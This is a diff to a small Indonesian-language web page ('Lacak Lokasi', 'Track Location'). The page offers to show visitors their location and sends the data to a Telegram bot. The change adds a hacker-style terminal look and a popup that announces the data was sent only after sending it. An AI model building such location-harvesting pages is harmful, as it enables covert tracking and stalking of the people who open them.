@@ -5,15 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lacak Lokasi</title>
     <style>
-        body { font-family: Arial, sans-serif; }
-        #location { margin-top: 20px; }
+        body { font-family: 'Courier New', monospace; background-color: #000; color: #0F0; }
+        h1, p, button { text-align: center; }
+        #location { margin-top: 20px; text-align: center; }
+        #popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #000; color: #0F0; padding: 20px; border: 2px solid #0F0; display: none; }
+        #terminal { width: 80%; margin: 0 auto; border: 2px solid #0F0; padding: 20px; background-color: #000; color: #0F0; font-size: 14px; }
+        #terminal p { margin: 10px 0; }
     </style>
 </head>
 <body>
-    <h1>Lacak Lokasi</h1>
-    <p>Klik tombol di bawah untuk melihat lokasi Anda:</p>
-    <button id="getLocation">Dapatkan Lokasi</button>
-    <div id="location"></div>
+    <div id="terminal">
+        <h1>Lacak Lokasi</h1>
+        <p>Klik tombol di bawah untuk melihat lokasi Anda:</p>
+        <button id="getLocation">Dapatkan Lokasi</button>
+        <div id="location"></div>
+    </div>
+
+    <div id="popup">
+        <p>Data lokasi berhasil dikirim ke Telegram bot!</p>
+        <button onclick="document.getElementById('popup').style.display='none';">Tutup</button>
+    </div>
 
     <script>
         document.getElementById('getLocation').addEventListener('click', function() {
@@ -47,9 +58,11 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Success:', data);
+                document.getElementById('popup').style.display = 'block';
             })
             .catch((error) => {
                 console.error('Error:', error);
+                document.getElementById('location').innerHTML = "Terjadi kesalahan saat mengirim data ke Telegram bot.";
             });
         }
 
